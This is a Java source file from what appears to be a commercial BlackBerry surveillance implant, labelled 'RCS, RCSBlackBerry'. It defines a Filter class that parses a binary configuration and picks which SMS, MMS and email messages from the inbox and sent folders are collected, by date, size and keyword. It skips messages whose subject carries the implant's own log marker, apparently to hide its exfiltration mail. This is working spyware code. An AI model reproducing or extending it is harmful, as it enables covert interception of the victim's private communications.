//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : Filter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent.mail;

import java.io.EOFException;
import java.util.Date;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Folder;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MessagingException;
import net.rim.device.api.util.DataBuffer;
import blackberry.agent.Prefix;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Sendmail;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class Filter.
 */
public class Filter {
    //#ifdef DEBUG
    static Debug debug = new Debug("Filter", DebugLevel.INFORMATION);
    //#endif

    public static final int TYPE_REALTIME = 0;
    public static final int TYPE_COLLECT = 1;

    public static final int CLASS_UNKNOWN = 0;
    public static final int CLASS_SMS = 1;
    public static final int CLASS_MMS = 2;
    public static final int CLASS_EMAIL = 3;

    static final int FILTERED_DISABLED = -1;
    static final int FILTERED_LASTCHECK = -2;
    static final int FILTERED_FROM = -3;
    static final int FILTERED_TO = -4;
    static final int FILTERED_SIZE = -5;
    static final int FILTERED_MESSAGE_ADDED = -6;
    static final int FILTERED_FOUND = -7;
    static final int FILTERED_INTERNAL = -8;
    static final int FILTERED_SENDMAIL = -9;
    static final int FILTERED_OK = 0;

    int[] folderTypes = new int[] { Folder.INBOX, Folder.SENT };

    public int size;

    public int version;
    public int type;
    public byte[] classname;
    public int classtype;

    public boolean enabled;
    public boolean all;
    public boolean doFilterFromDate;
    public Date fromDate;
    public boolean doFilterToDate;
    public Date toDate;
    public int maxMessageSize;
    public int maxMessageSizeToLog;

    public Vector keywords = new Vector();

    boolean valid;

    public int payloadStart;

    /**
     * Instantiates a new filter.
     * 
     * @param conf
     *            the conf
     * @param offset
     *            the offset
     * @param length
     *            the length
     */
    public Filter(final byte[] conf, final int offset, final int length) {

        final int headerSize = 116;
        final int classNameLen = 64;
        final int confSize = conf.length - offset;
        //#ifdef DBC
        Check.requires(confSize >= headerSize, "conf smaller than needed");
        //#endif

        final Prefix headerPrefix = new Prefix(conf, offset);

        if (!headerPrefix.isValid()) {
            return;
        }

        final DataBuffer databuffer = new DataBuffer(conf,
                headerPrefix.payloadStart, headerPrefix.length, false);

        //#ifdef DBC
        Check.asserts(headerPrefix.type == Prefix.TYPE_HEADER,
                "Wrong prefix type");
        Check.asserts(headerSize == headerPrefix.length, "Wrong prefix length");
        //#endif

        // LETTURA del HEADER
        try {

            size = databuffer.readInt();
            version = databuffer.readInt();
            type = databuffer.readInt();

            classname = new byte[classNameLen];
            databuffer.read(classname);

            final String classString = WChar.getString(classname, true);
            if (classString.equals("IPM.SMSText*")) {
                classtype = Filter.CLASS_SMS;
            } else if (classString.equals("IPM.Note*")) {
                classtype = Filter.CLASS_EMAIL;
            } else if (classString.equals("IPM.MMS*")) {
                classtype = Filter.CLASS_MMS;
            } else {
                classtype = Filter.CLASS_UNKNOWN;
                //#ifdef DEBUG
                debug.error("classtype unknown: " + classString);
                //#endif
            }

            //#ifdef DEBUG_TRACE
            debug.trace("classname: " + classString);
            //#endif

            enabled = databuffer.readInt() == 1;
            all = databuffer.readInt() == 1;
            doFilterFromDate = databuffer.readInt() == 1;
            final long filetimeFromDate = databuffer.readLong();
            doFilterToDate = databuffer.readInt() == 1;
            final long filetimeToDate = databuffer.readLong();
            maxMessageSize = databuffer.readInt();
            maxMessageSizeToLog = databuffer.readInt();

            if (doFilterFromDate) {
                final DateTime dt = new DateTime(filetimeFromDate);
                fromDate = dt.getDate();
                //#ifdef DEBUG_TRACE
                debug.trace("from: " + fromDate.toString());
                //#endif
            }
            if (doFilterToDate) {
                final DateTime dt = new DateTime(filetimeToDate);
                toDate = dt.getDate();
                //#ifdef DEBUG_TRACE
                debug.trace("to: " + toDate.toString());
                //#endif
            }
            //#ifdef DEBUG_TRACE
            debug.trace("maxMessageSize: " + maxMessageSize);
            debug.trace("maxMessageSizeToLog: " + maxMessageSizeToLog);
            //#endif

            payloadStart = (headerPrefix.payloadStart + size);

            valid = true;
        } catch (final EOFException e) {
            valid = false;
            //#ifdef DEBUG_ERROR
            debug.error("filter:" + e);
            //#endif
        }

        // Lettura delle KEYWORDS
        if (length > headerPrefix.length) {
            // ogni keyword ha il suo prefix
            final int endOffset = offset + length;
            int keywordOffset = offset + headerSize + Prefix.LEN;

            while (keywordOffset < endOffset) {
                final Prefix keywordPrefix = new Prefix(conf, keywordOffset);

                //#ifdef DBC
                Check.asserts(keywordPrefix.type == Prefix.TYPE_KEYWORD,
                        "Wrong prefix type");
                //#endif

                final String keyword = WChar.getString(conf, keywordOffset,
                        keywordPrefix.length, false);
                keywordOffset += keywordPrefix.length + Prefix.LEN;

                //#ifdef DEBUG_INFO
                debug.info("Keyword: " + keyword);
                //#endif
                keywords.addElement(keyword);
            }
        }
    }

    /**
     * Filter message.
     * 
     * @param message
     *            the message
     * @param lastcheck
     *            the lastcheck
     * @param checkAdded
     * @return the int
     * @throws MessagingException
     *             the messaging exception
     */
    public final int filterMessage(final Message message, final long lastcheck)
            throws MessagingException {

        //#ifdef DBC
        Check.requires(message != null, "filterMessage: message != null");
        //#endif

        long receivedTime;

        if (!enabled) {
            //#ifdef DEBUG_INFO
            debug.info("Disabled");
            //#endif            
            return FILTERED_DISABLED;
        }

        final Address[] from = message
                .getRecipients(Message.RecipientType.FROM);
        //#ifdef DBC
        Check.asserts(from != null, "filterMessage: from!=null");
        //#endif

        if (message.getSubject().startsWith(Sendmail.LOGSUBJECT)) {
            return FILTERED_SENDMAIL;
        }

        final Folder folder = message.getFolder();

        boolean found = false;
        if (folder != null) {
            final int folderType = folder.getType();
            final int fsize = folderTypes.length;

            for (int i = 0; i < fsize; i++) {
                if (folderTypes[i] == folderType) {
                    found = true;
                    break;
                }
            }
        }

        if (!found) {
            //#ifdef DEBUG_INFO
            debug.info("filterMessage: FILTERED_FOUND: " + folder.getName()
                    + " type: " + folder.getType());
            //#endif
            return FILTERED_FOUND;
        }

        receivedTime = message.getReceivedDate().getTime();
        if (lastcheck != 0 && receivedTime < lastcheck) {
            //#ifdef DEBUG_INFO
            debug.info("receivedTime < lastcheck :" + receivedTime + " < "
                    + lastcheck);
            //#endif
            return FILTERED_LASTCHECK;
        }

        // se c'e' il filtro from e non viene rispettato escludi la mail
        if (doFilterFromDate == true && receivedTime < fromDate.getTime()) {
            //#ifdef DEBUG_INFO
            debug.info("doFilterFromDate: " + fromDate);
            //#endif
            return FILTERED_FROM;
        }

        // Se c'e' anche il filtro della data di fine e non viene rispettato
        // escludi la mail
        if (doFilterToDate == true && receivedTime > toDate.getTime()) {
            //#ifdef DEBUG_INFO
            debug.info("doFilterToDate: " + toDate);
            //#endif
            return FILTERED_TO;
        }

        if ((maxMessageSizeToLog > 0)
                && (message.getSize() > maxMessageSizeToLog)) {
            //#ifdef DEBUG_INFO
            debug.info("maxMessageSizeToLog: " + maxMessageSizeToLog);
            //#endif
            return FILTERED_SIZE;
        }

        return FILTERED_OK;
    }

    public final int filterMessage(final Message message)
            throws MessagingException {
        return filterMessage(message, 0);

    }

    /**
     * Checks if is valid.
     * 
     * @return true, if is valid
     */
    public final boolean isValid() {
        return valid;
    }

    public final String toString() {
        final StringBuffer sb = new StringBuffer();
        switch (classtype) {
        case Filter.CLASS_EMAIL:
            sb.append("EMAIL ");
            break;
        case Filter.CLASS_MMS:
            sb.append("MMS ");
            break;
        case Filter.CLASS_SMS:
            sb.append("SMS ");
            break;
        }
        if (type == TYPE_COLLECT) {
            sb.append(" COLLECT");
        } else if (type == TYPE_REALTIME) {
            sb.append(" RT");
        }

        if (doFilterFromDate == true && fromDate != null) {
            sb.append(" from: ");
            sb.append(fromDate);
        }

        if (doFilterToDate == true && toDate != null) {
            sb.append(" to: ");
            sb.append(toDate);
        }

        sb.append(" size: " + maxMessageSize);
        sb.append(" log: " + maxMessageSizeToLog);
        sb.append(" en: " + enabled);

        return sb.toString();
    }
}
